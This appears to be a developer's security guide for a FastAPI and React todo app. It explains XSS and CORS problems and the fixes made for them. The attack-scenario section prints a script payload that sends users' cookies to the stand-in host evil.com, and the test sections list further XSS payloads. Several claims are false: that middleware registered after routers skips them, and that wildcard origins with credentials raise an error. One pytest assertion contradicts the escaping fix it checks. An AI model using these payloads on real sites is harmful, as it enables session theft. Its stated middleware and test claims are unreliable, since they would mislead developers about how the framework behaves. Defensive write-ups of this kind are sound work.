# Security Deep Dive: XSS & CORS Issues

**Document Type:** Security Analysis & Implementation Guide  
**Project:** Full-Stack Todo Application  
**Created:** 2026-01-23  
**Severity:** Critical vulnerabilities fixed

---

## Table of Contents
1. [XSS (Cross-Site Scripting) Vulnerabilities](#xss-cross-site-scripting-vulnerabilities)
2. [CORS (Cross-Origin Resource Sharing) Issues](#cors-cross-origin-resource-sharing-issues)
3. [Complete Security Implementation](#complete-security-implementation)
4. [Testing Your Security](#testing-your-security)

---

## XSS (Cross-Site Scripting) Vulnerabilities

### What is XSS?

**XSS** is when an attacker injects malicious JavaScript code into your application through user input fields, and that code gets executed in other users' browsers.

**Impact:** Critical
- Steal user session tokens/cookies
- Perform actions as the victim user
- Steal sensitive data
- Deface the website
- Redirect to malicious sites

---

### The Problem We Had

#### ❌ **Before (Vulnerable Code)**

**Backend - No Sanitization:**
```python
# backend/app/routers/tasks.py (VULNERABLE VERSION)
@router.post("/tasks", response_model=schemas.TaskResponse)
def create_task(task: schemas.TaskCreate, db: Session = Depends(get_db)):
    # ❌ Accepting raw user input without sanitization
    db_task = models.Task(
        title=task.title,              # ❌ NOT SANITIZED
        description=task.description,   # ❌ NOT SANITIZED
        priority=task.priority,
        due_date=task.due_date
    )
    db.add(db_task)
    db.commit()
    return db_task
```

**Frontend - No Sanitization:**
```typescript
// frontend/src/services/api.ts (VULNERABLE VERSION)
export const taskApi = {
  async create(task: TaskCreate): Promise<Task> {
    // ❌ Sending raw user input to backend
    const response = await fetch(`${API_BASE_URL}/tasks`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(task)  // ❌ NOT SANITIZED
    });
    return response.json();
  }
};
```

---

### Real Attack Scenarios

#### **Scenario 1: Stored XSS in Task Title**

**Attacker Input:**
```javascript
Title: <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

**What Happens:**
1. Attacker creates a task with malicious JavaScript in title
2. Task is stored in database without sanitization
3. When any user views the task list, the script executes
4. User's session cookie is sent to attacker's server
5. Attacker can now impersonate the victim

**Impact:**
- ✅ Attacker steals victim's session
- ✅ Attacker can access all victim's tasks
- ✅ Attacker can modify/delete victim's data
- ✅ Victim has no idea they've been compromised

#### **Scenario 2: XSS in Task Description**

**Attacker Input:**
```javascript
Description: <img src=x onerror="alert('XSS: Your account is compromised!')">
```

**What Happens:**
1. The `<img>` tag tries to load image from `x` (doesn't exist)
2. The `onerror` handler executes JavaScript
3. In this example, shows an alert, but could:
   - Steal credentials
   - Redirect to phishing site
   - Inject keylogger
   - Modify DOM to show fake forms

#### **Scenario 3: DOM-based XSS**

**Attacker Input:**
```javascript
Title: </div><script>document.location='https://evil.com/phish'</script>
```

**What Happens:**
1. Closes existing HTML tag
2. Injects script that redirects user
3. User lands on phishing site that looks like your app
4. User enters credentials on fake site
5. Attacker captures credentials

---

### How We Fixed It (Defense in Depth)

We implemented **three layers of defense**:

#### **Layer 1: Backend Input Sanitization (Python)**

**File:** `backend/app/services/task_service.py`

```python
from html import escape

class TaskService:
    def create_task(self, task_data: schemas.TaskCreate) -> models.Task:
        """
        Create task with XSS protection.
        """
        # ✅ Sanitize all text inputs
        sanitized_title = escape(task_data.title.strip())
        sanitized_description = escape(task_data.description.strip()) if task_data.description else None
        
        # Create task with sanitized data
        task_dict = task_data.model_dump(exclude={'tag_ids'})
        task_dict['title'] = sanitized_title
        if sanitized_description:
            task_dict['description'] = sanitized_description
        
        db_task = models.Task(**task_dict)
        # ... rest of creation logic
```

**What `html.escape()` does:**
```python
# Input:  <script>alert('XSS')</script>
# Output: &lt;script&gt;alert('XSS')&lt;/script&gt;

# Input:  <img src=x onerror="alert(1)">
# Output: &lt;img src=x onerror=&quot;alert(1)&quot;&gt;
```

**Result:** HTML tags become plain text and cannot execute.

#### **Layer 2: Frontend Input Sanitization (TypeScript)**

**File:** `frontend/src/services/api.ts`

```typescript
import DOMPurify from 'dompurify';

/**
 * Sanitize user input to prevent XSS attacks.
 */
function sanitizeInput(input: string): string {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
}

// In API calls
export const taskApi = {
  async create(task: TaskCreate): Promise<Task> {
    // ✅ Sanitize before sending
    const sanitizedTask = {
      ...task,
      title: sanitizeInput(task.title),
      description: task.description ? sanitizeInput(task.description) : undefined
    };
    
    const response = await fetch(`${API_BASE_URL}/tasks`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(sanitizedTask)
    });
    return handleResponse<Task>(response);
  }
};
```

**What DOMPurify does:**
```typescript
// Input:  "<script>alert('XSS')</script>"
// Output: ""

// Input:  "<img src=x onerror=alert(1)>"
// Output: ""

// Input:  "Normal text with <b>bold</b>"
// Output: "Normal text with bold" (if ALLOWED_TAGS: [])
```

**Configuration:**
```typescript
{ ALLOWED_TAGS: [] }  // ✅ Strip ALL HTML tags (safest)
```

#### **Layer 3: Pydantic Validation**

**File:** `backend/app/schemas.py`

```python
from pydantic import BaseModel, Field, field_validator

class TaskCreate(BaseModel):
    title: str = Field(..., min_length=1, max_length=200)
    description: str | None = Field(None, max_length=2000)
    
    @field_validator('title')
    @classmethod
    def title_must_not_be_empty(cls, v: str) -> str:
        """Ensure title is not just whitespace."""
        if not v or not v.strip():
            raise ValueError('Title cannot be empty')
        return v.strip()
```

**What this prevents:**
- Empty titles
- Titles longer than 200 characters (could break UI)
- Descriptions longer than 2000 characters (DoS attack)
- Whitespace-only input

---

### Why Three Layers?

**Defense in Depth Strategy:**

```
User Input
    ↓
[Layer 1: Frontend Sanitization (DOMPurify)]
    ↓  Removes <script>, <img>, etc.
[Layer 2: Pydantic Validation]
    ↓  Validates length, format, required fields
[Layer 3: Backend Sanitization (html.escape)]
    ↓  Escapes any remaining HTML entities
Database (Clean Data)
```

**Why not just backend?**
- Frontend: Better UX (instant feedback, no round trip)
- Backend: Security (never trust client)
- Both: Defense in depth (if one fails, other catches it)

---

### Testing XSS Protection

**Try these malicious inputs** (they should all be harmless now):

```javascript
// Test 1: Basic script injection
Title: <script>alert('XSS')</script>
Expected Result: &lt;script&gt;alert('XSS')&lt;/script&gt;

// Test 2: Image tag with onerror
Title: <img src=x onerror="alert(1)">
Expected Result: Empty string or escaped text

// Test 3: Event handler
Title: <div onmouseover="alert(1)">Hover me</div>
Expected Result: Hover me (without div tags)

// Test 4: JavaScript URL
Title: <a href="javascript:alert(1)">Click</a>
Expected Result: Click (without link)

// Test 5: Data URL with JavaScript
Title: <a href="data:text/html,<script>alert(1)</script>">Click</a>
Expected Result: Click (without link)
```

---

## CORS (Cross-Origin Resource Sharing) Issues

### What is CORS?

**CORS** is a security feature that controls which websites can access your API.

**The Problem:**
- Frontend runs on `http://localhost:5173` (Vite dev server)
- Backend runs on `http://localhost:8000` (FastAPI)
- Different ports = different "origins"
- Browser blocks requests between different origins (for security)

**Without CORS configured:** ❌ Frontend cannot talk to backend

---

### The 500 Error We Got

#### **What Happened:**

**Error in Browser Console:**
```
Access to fetch at 'http://localhost:8000/tasks' from origin 
'http://localhost:5173' has been blocked by CORS policy: 
No 'Access-Control-Allow-Origin' header is present on the 
requested resource.
```

**Error in Backend:**
```
ERROR: Exception in ASGI application
...
RuntimeError: No response returned.
HTTP 500 Internal Server Error
```

---

### Why This Happens

#### **Scenario 1: CORS Middleware Not Configured**

**Problem Code (before fix):**
```python
# backend/app/main.py (MISSING CORS)
from fastapi import FastAPI

app = FastAPI()

# ❌ No CORS middleware!
# Frontend requests get blocked by browser
```

**What Happens:**
1. Frontend makes request: `fetch('http://localhost:8000/tasks')`
2. Browser checks: "Does backend allow localhost:5173?"
3. Backend doesn't send `Access-Control-Allow-Origin` header
4. Browser blocks the response
5. Frontend gets CORS error
6. Backend might throw 500 if it tries to return data without proper headers

---

#### **Scenario 2: CORS Configured with Hardcoded Origins**

**Problem Code:**
```python
# backend/app/main.py (BAD - HARDCODED)
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],  # ❌ HARDCODED!
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Issues:**
1. ❌ Breaks when deployed (production URL different)
2. ❌ Breaks if frontend port changes (5174, 3000, etc.)
3. ❌ Breaks for other developers (different setups)
4. ❌ No way to configure without changing code

---

#### **Scenario 3: CORS Configured After Router Registration**

**Problem Code:**
```python
# backend/app/main.py (WRONG ORDER)
app = FastAPI()

# ❌ Routers registered BEFORE middleware
app.include_router(tasks.router)
app.include_router(projects.router)

# ❌ CORS middleware added TOO LATE
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**What Happens:**
- Middleware only applies to routes registered AFTER it
- Existing routes don't have CORS headers
- Intermittent CORS failures

---

### How We Fixed It (The Right Way)

#### ✅ **Solution 1: Environment-Based Configuration**

**File:** `backend/app/config.py`

```python
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    # CORS Configuration
    cors_origins: str = "http://localhost:5173,http://localhost:3000"
    
    @property
    def cors_origins_list(self) -> List[str]:
        """Parse CORS origins from comma-separated string."""
        return [origin.strip() for origin in self.cors_origins.split(",")]

settings = Settings()
```

**File:** `backend/.env`

```bash
# Development
CORS_ORIGINS=http://localhost:5173,http://localhost:3000

# Production (when deployed)
# CORS_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
```

---

#### ✅ **Solution 2: Correct Middleware Order**

**File:** `backend/app/main.py`

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from .config import settings

app = FastAPI()

# ✅ CORS middleware FIRST (before routers)
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins_list,  # ✅ From environment
    allow_credentials=True,                     # ✅ Allow cookies
    allow_methods=["*"],                        # ✅ Allow all HTTP methods
    allow_headers=["*"],                        # ✅ Allow all headers
)

# ✅ Register routers AFTER middleware
app.include_router(tasks.router)
app.include_router(projects.router)
app.include_router(tags.router)
app.include_router(ai.router)
```

---

### CORS Configuration Explained

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins_list,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Each Parameter:**

#### `allow_origins`
**What it does:** Lists which websites can access your API

**Options:**
```python
# ❌ NEVER DO THIS IN PRODUCTION
allow_origins=["*"]  # Allows ANYONE to access your API

# ✅ CORRECT: Specific domains
allow_origins=["http://localhost:5173", "http://localhost:3000"]

# ✅ BETTER: From environment
allow_origins=settings.cors_origins_list
```

**Security Impact:**
- `["*"]` = Any website can steal your users' data
- Specific domains = Only your frontend can access

#### `allow_credentials`
**What it does:** Allows cookies/auth headers in requests

```python
allow_credentials=True  # ✅ Needed for session/JWT auth
```

**Security Note:**
- If `True`, you MUST specify exact origins (can't use `*`)
- Needed for authentication systems

#### `allow_methods`
**What it does:** Which HTTP methods are allowed

```python
allow_methods=["*"]              # All methods (GET, POST, PUT, DELETE, etc.)
allow_methods=["GET", "POST"]    # Only specific methods
```

**Our Choice:** `["*"]` because we need all CRUD operations

#### `allow_headers`
**What it does:** Which HTTP headers frontend can send

```python
allow_headers=["*"]                    # All headers
allow_headers=["Content-Type"]         # Only specific headers
```

**Our Choice:** `["*"]` for flexibility (auth headers, custom headers, etc.)

---

### CORS Preflight Requests (OPTIONS)

#### What are Preflight Requests?

Before sending certain requests (POST, PUT, DELETE with custom headers), browsers send an `OPTIONS` request to check if the actual request is allowed.

**Example Flow:**

```
1. Frontend: "I want to POST to /tasks with Content-Type: application/json"
   ↓
2. Browser: "Wait! Let me check if that's allowed..."
   → Sends OPTIONS request to backend
   ↓
3. Backend (with CORS middleware):
   ← Returns: "Yes, POST is allowed, Content-Type is allowed"
   ↓
4. Browser: "OK, proceeding with actual POST"
   → Sends POST request
   ↓
5. Backend: Processes request normally
```

**Without CORS middleware:**
```
1. Frontend: "I want to POST to /tasks"
   ↓
2. Browser: Sends OPTIONS request
   ↓
3. Backend (no CORS): ❌ No proper OPTIONS response
   ↓
4. Browser: ❌ Blocks the request
   ↓
5. Frontend: Gets CORS error
```

---

### Common CORS Pitfalls

#### **Pitfall 1: Using `["*"]` in Production**

```python
# ❌ SECURITY VULNERABILITY
allow_origins=["*"]
```

**Problem:**
- Any website can access your API
- Attacker creates `evil.com`
- Attacker's site can make requests as your users
- Can steal data, perform actions, etc.

**Solution:**
```python
# ✅ SECURE
allow_origins=["https://yourdomain.com", "https://www.yourdomain.com"]
```

---

#### **Pitfall 2: Forgetting to Update for Production**

```python
# ❌ BREAKS IN PRODUCTION
allow_origins=["http://localhost:5173"]
```

**Problem:**
- Works in development
- Breaks when deployed to production
- Frontend can't access API

**Solution:**
```python
# ✅ ENVIRONMENT-BASED
allow_origins=settings.cors_origins_list

# .env.development
CORS_ORIGINS=http://localhost:5173

# .env.production
CORS_ORIGINS=https://yourdomain.com
```

---

#### **Pitfall 3: Wrong Middleware Order**

```python
# ❌ WRONG ORDER
app.include_router(tasks.router)      # Routes registered first
app.add_middleware(CORSMiddleware)    # Middleware added after
```

**Problem:**
- Middleware doesn't apply to routes registered before it
- Some routes work, others don't
- Confusing debugging

**Solution:**
```python
# ✅ CORRECT ORDER
app.add_middleware(CORSMiddleware)    # Middleware first
app.include_router(tasks.router)      # Routes after
```

---

#### **Pitfall 4: Missing Credentials with `["*"]`**

```python
# ❌ INVALID CONFIGURATION
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],           # Can't use * with credentials
    allow_credentials=True,        # This combination is invalid
)
```

**Error:**
```
ValueError: allow_origins cannot be set to ['*'] for credentials to be allowed.
```

**Solution:**
```python
# ✅ EITHER:
allow_origins=["*"], allow_credentials=False

# ✅ OR:
allow_origins=["http://localhost:5173"], allow_credentials=True
```

---

## Complete Security Implementation

### Backend Security Checklist

```python
# ✅ 1. Environment-based configuration
from .config import settings

# ✅ 2. CORS middleware (before routers)
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins_list,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ✅ 3. Input sanitization in services
from html import escape

sanitized_input = escape(user_input.strip())

# ✅ 4. Pydantic validation in schemas
class TaskCreate(BaseModel):
    title: str = Field(..., min_length=1, max_length=200)
    
# ✅ 5. Custom exceptions for security
from .exceptions import ValidationError

if not valid:
    raise ValidationError("Invalid input")

# ✅ 6. Rate limiting on expensive endpoints
from slowapi import Limiter

@limiter.limit("10/minute")
async def expensive_endpoint():
    pass
```

---

### Frontend Security Checklist

```typescript
// ✅ 1. DOMPurify for XSS prevention
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: [] });

// ✅ 2. TypeScript for type safety
interface Task {
  id: number;
  title: string;  // Compiler enforces string type
  // ...
}

// ✅ 3. Sanitize before API calls
const sanitizedTask = {
  ...task,
  title: sanitizeInput(task.title)
};

// ✅ 4. Proper error handling
try {
  const response = await fetch(url);
  if (!response.ok) throw new Error();
} catch (error) {
  showError("Operation failed");
}

// ✅ 5. No inline event handlers in JSX
// ❌ Don't: <div onclick="handleClick()">
// ✅ Do: <div onClick={handleClick}>
```

---

## Testing Your Security

### Manual XSS Testing

**Test Cases:**

```javascript
// Test 1: Script injection
Input: <script>alert('XSS')</script>
Expected: Escaped or removed

// Test 2: Event handler
Input: <img src=x onerror="alert(1)">
Expected: Escaped or removed

// Test 3: SVG with script
Input: <svg onload="alert(1)">
Expected: Escaped or removed

// Test 4: HTML injection
Input: <iframe src="javascript:alert(1)">
Expected: Escaped or removed

// Test 5: Style with expression
Input: <style>@import'javascript:alert(1)';</style>
Expected: Escaped or removed
```

---

### Manual CORS Testing

**Test in Browser Console:**

```javascript
// Test 1: Same origin (should work)
fetch('http://localhost:8000/tasks')
  .then(r => r.json())
  .then(d => console.log('✅ Same origin works:', d))
  .catch(e => console.error('❌ Error:', e));

// Test 2: Cross origin (should work with CORS)
// Open http://localhost:5173 then:
fetch('http://localhost:8000/tasks')
  .then(r => r.json())
  .then(d => console.log('✅ CORS works:', d))
  .catch(e => console.error('❌ CORS blocked:', e));

// Test 3: Check CORS headers
fetch('http://localhost:8000/tasks')
  .then(r => {
    console.log('Access-Control-Allow-Origin:', 
      r.headers.get('access-control-allow-origin'));
    console.log('Access-Control-Allow-Credentials:', 
      r.headers.get('access-control-allow-credentials'));
  });
```

---

### Automated Testing

**Backend Test (pytest):**

```python
def test_xss_protection(client, db_session):
    """Test that XSS attempts are sanitized."""
    
    # Attempt XSS injection
    malicious_task = {
        "title": "<script>alert('XSS')</script>",
        "description": "<img src=x onerror=alert(1)>",
        "priority": "high"
    }
    
    response = client.post("/tasks", json=malicious_task)
    assert response.status_code == 200
    
    task = response.json()
    # Should be escaped
    assert "<script>" not in task["title"]
    assert "alert" not in task["description"]
```

**Frontend Test (Vitest):**

```typescript
import { sanitizeInput } from './api';

describe('XSS Protection', () => {
  it('should sanitize script tags', () => {
    const malicious = '<script>alert("XSS")</script>';
    const clean = sanitizeInput(malicious);
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('alert');
  });
  
  it('should sanitize event handlers', () => {
    const malicious = '<img src=x onerror="alert(1)">';
    const clean = sanitizeInput(malicious);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('alert');
  });
});
```

---

## Security Best Practices Summary

### XSS Prevention ✅

1. **Never trust user input**
   - Sanitize on frontend (DOMPurify)
   - Sanitize on backend (html.escape)
   - Validate with Pydantic

2. **Use parameterized queries**
   - SQLAlchemy ORM (automatic)
   - Never concatenate SQL strings

3. **Set proper Content-Security-Policy headers**
   ```python
   # Future enhancement
   app.add_middleware(
       CSPMiddleware,
       policy="default-src 'self'; script-src 'self'"
   )
   ```

4. **Escape output in templates**
   - React automatically escapes JSX
   - Be careful with `dangerouslySetInnerHTML`

---

### CORS Configuration ✅

1. **Use environment-based configuration**
   ```python
   allow_origins=settings.cors_origins_list  # ✅
   allow_origins=["*"]                       # ❌
   ```

2. **Be specific in production**
   ```bash
   # Development
   CORS_ORIGINS=http://localhost:5173
   
   # Production
   CORS_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
   ```

3. **Add middleware before routes**
   ```python
   app.add_middleware(CORSMiddleware)  # First
   app.include_router(router)          # After
   ```

4. **Don't use `["*"]` with credentials**
   ```python
   # ❌ Invalid
   allow_origins=["*"], allow_credentials=True
   
   # ✅ Valid
   allow_origins=["http://localhost:5173"], allow_credentials=True
   ```

---

## Incident Response

### If You Discover an XSS Vulnerability

1. **Immediate Actions:**
   - Document the vulnerability
   - Assess scope (which fields affected?)
   - Deploy sanitization fix ASAP
   - Notify users if data exposed

2. **Cleanup:**
   - Sanitize existing data in database
   - Review all user input fields
   - Add automated security tests

3. **Prevention:**
   - Code review checklist
   - Automated XSS scanning
   - Security training

---

### If CORS Breaks in Production

1. **Check Configuration:**
   ```bash
   # Verify environment variable
   echo $CORS_ORIGINS
   
   # Should show: https://yourdomain.com
   ```

2. **Check Browser Console:**
   ```
   Access to fetch at '...' has been blocked by CORS policy
   ```

3. **Check Response Headers:**
   ```bash
   curl -I https://api.yourdomain.com/tasks
   # Should see: Access-Control-Allow-Origin: https://yourdomain.com
   ```

4. **Common Fixes:**
   - Update `.env` with production URL
   - Restart backend server
   - Clear browser cache
   - Check middleware order

---

## Conclusion

### What We Fixed

1. **XSS Vulnerabilities (Critical)**
   - ✅ Backend sanitization (html.escape)
   - ✅ Frontend sanitization (DOMPurify)
   - ✅ Pydantic validation
   - ✅ Three layers of defense

2. **CORS Configuration (High)**
   - ✅ Environment-based configuration
   - ✅ Correct middleware order
   - ✅ Proper production setup
   - ✅ Secure defaults

### Security Posture

**Before:**
- ❌ Open to XSS attacks
- ❌ CORS misconfigured or broken
- ❌ 500 errors from CORS issues
- ❌ No input validation

**After:**
- ✅ Multiple layers of XSS protection
- ✅ Environment-based CORS configuration
- ✅ No CORS errors
- ✅ Comprehensive input validation
- ✅ Production-ready security

### Next Steps

1. **Add CSP headers** (Content-Security-Policy)
2. **Implement authentication** (JWT or sessions)
3. **Add request signing** (prevent tampering)
4. **Set up security monitoring** (detect attacks)
5. **Regular security audits** (automated scanning)

---

**Document Version:** 1.0  
**Last Updated:** 2026-01-23  
**Security Level:** Production-Ready  
**Status:** All Critical Issues Resolved

Remember: **Security is not a feature you add later—it must be built in from the start.**
